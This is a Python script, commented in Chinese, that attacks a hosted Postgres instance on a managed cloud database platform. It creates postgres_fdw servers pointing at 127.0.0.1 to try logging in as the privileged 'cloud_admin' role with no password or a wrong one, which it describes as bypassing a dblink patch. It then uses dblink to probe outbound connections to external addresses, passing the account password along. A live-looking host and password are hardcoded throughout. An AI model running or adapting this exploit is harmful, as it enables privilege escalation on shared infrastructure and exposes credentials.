# -*- coding: utf-8 -*-
"""postgres_fdw 127.0.0.1 全矩阵(dblink 补丁覆盖一致性) - 即建即测即清
变体: user/password 组合 x dbname(postgres 平台库/neondb)
若 127.0.0.1 内部口有 trust 且 fdw 未被补丁覆盖 -> 可冒用任意角色(cloud_admin) = 平行绕过
"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)

c = psycopg.connect(URI, connect_timeout=20)
c.autocommit = True
cur = c.cursor()

def q(sql):
    try:
        cur.execute(sql)
        try:
            return cur.fetchall()
        except Exception:
            return 'OK(no rows)'
    except Exception as e:
        return 'ERR: %s' % str(e)[:200]

def probe(name, dbname, user, pwd):
    """单个 fdw 变体: server+mapping+ft -> 触发查询 -> 清理"""
    opt_pwd = "password '%s'" % pwd if pwd is not None else "password ''"
    steps = [
        ("CREATE SERVER %s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '127.0.0.1', port '5432', dbname '%s')" % (name, dbname)),
        ("CREATE USER MAPPING FOR CURRENT_USER SERVER %s OPTIONS (user '%s', %s)" % (name, user, opt_pwd)),
        ("CREATE FOREIGN TABLE %s_t (id int, updated_at timestamptz) SERVER %s OPTIONS (schema_name 'public', table_name 'health_check')" % (name, name)),
    ]
    for s in steps:
        try:
            cur.execute(s)
        except Exception as e:
            return '%s -> ERR at setup: %s' % (name, str(e)[:150])
    # 触发真实连接
    try:
        cur.execute("SELECT * FROM %s_t LIMIT 1" % name)
        rows = cur.fetchall()
        cur.execute("SELECT current_user, session_user, version()")
        ident = cur.fetchall()
        return '%s -> CONNECTED! rows=%s ident=%s' % (name, rows, ident)
    except Exception as e:
        return '%s -> query ERR: %s' % (name, str(e)[:250])
    finally:
        for d in ("DROP FOREIGN TABLE IF EXISTS %s_t" % name,
                  "DROP SERVER IF EXISTS %s CASCADE" % name):
            try: cur.execute(d)
            except Exception: pass

print('=== postgres_fdw 127.0.0.1 矩阵(每变体即建即测即清) ===')
print('--- 先建扩展 ---')
print(q("CREATE EXTENSION IF NOT EXISTS postgres_fdw"))

print('\n[A] neondb_owner 真密码 -> neondb 库(自连基线)')
print(probe('k_fdw_a', 'neondb', 'neondb_owner', PWD))
print('\n[B] neondb_owner 真密码 -> postgres 库(平台库跨库)')
print(probe('k_fdw_b', 'postgres', 'neondb_owner', PWD))
print('\n[C] cloud_admin 无密码 -> postgres 库(trust 探测)')
print(probe('k_fdw_c', 'postgres', 'cloud_admin', None))
print('\n[D] cloud_admin 假密码 -> postgres 库')
print(probe('k_fdw_d', 'postgres', 'cloud_admin', 'wrongpass123'))
print('\n[E] neondb_owner 无密码 -> postgres 库(trust 探测2)')
print(probe('k_fdw_e', 'postgres', 'neondb_owner', None))
print('\n[F] cloud_admin 真密码猜测 -> 127.0.0.1 (错误消息细节)')
print(probe('k_fdw_f', 'postgres', 'cloud_admin', PWD))

print('\n=== dblink 出网探测(补装 dblink 后连外部) ===')
print(q("CREATE EXTENSION IF NOT EXISTS dblink"))
import time
for target in ['8.8.8.8', '1.1.1.1', '172.16.0.1', '10.0.0.1']:
    t0 = time.time()
    r = q("SELECT dblink_connect('k_out', 'host=%s port=5432 dbname=postgres user=neondb_owner password=%s connect_timeout=5')" % (target, PWD))
    print('  %s:5432 -> %s (%.1fs)' % (target, r, time.time() - t0))
    try:
        cur.execute("SELECT dblink_disconnect('k_out')")
    except Exception:
        pass

print('\n=== 清理 ===')
print(q("DROP EXTENSION IF EXISTS postgres_fdw CASCADE"))
print(q("DROP EXTENSION IF EXISTS dblink CASCADE"))
print(q("SELECT extname FROM pg_extension WHERE extname IN ('postgres_fdw','dblink')"))
print(q("SELECT srvname FROM pg_foreign_server"))
print(q("SELECT count(*) FROM pg_user_mapping"))
c.close()
